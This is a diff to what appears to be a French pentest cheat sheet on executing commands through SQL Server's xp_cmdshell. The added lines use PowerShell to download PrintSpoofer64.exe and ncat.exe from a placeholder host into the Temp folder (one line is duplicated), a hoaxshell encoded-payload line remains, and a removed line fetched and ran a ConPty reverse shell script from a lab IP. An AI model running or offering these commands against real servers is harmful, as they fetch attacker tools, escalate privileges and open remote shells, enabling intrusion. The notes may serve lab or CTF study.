@@ -161,13 +161,15 @@ RECONFIGURE
 
 --  Execution de commande (after enabling it)
 xp_cmdshell whoami
+xp_cmdshell whoami /priv
+xp_cmdshell "powershell iwr http://x.x.x.x/PrintSpoofer64.exe -o $($env:Temp)\PrintSpoofer.exe";
+xp_cmdshell "powershell iwr http://x.x.x.x/ncat.exe -o $($env:Temp)\ncat.exe";
+xp_cmdshell "powershell iwr http://x.x.x.x/ncat.exe -o $($env:Temp)\ncat.exe";
+
 xp_cmdshell "powershell -e <hoaxshell payload>";
 
-xp_cmdshell "powershell IEX(New-Object Net.webclient).downloadString(\"http://10.10.14.3:8000/windows/nishang/Shells/Invoke-ConPtyShell.ps1
-\")";
 
 ```
-
 
 #### Capture de Hash
 
